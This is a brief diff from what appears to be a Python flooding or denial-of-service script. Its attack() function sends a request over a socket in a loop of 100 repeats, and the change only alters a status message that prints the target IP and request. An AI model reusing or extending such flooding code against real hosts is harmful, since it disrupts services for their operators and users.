@@ -69,7 +69,7 @@ def attack():
       for y in range(100):
           print("\033[33")
           atk.send(str.encode(request))
-          print("http://" +str(ip)+"")
+          print("http://" +(ip)+"" +str(request)+"")
     except socket.error:
       time.sleep(.1)
     except:
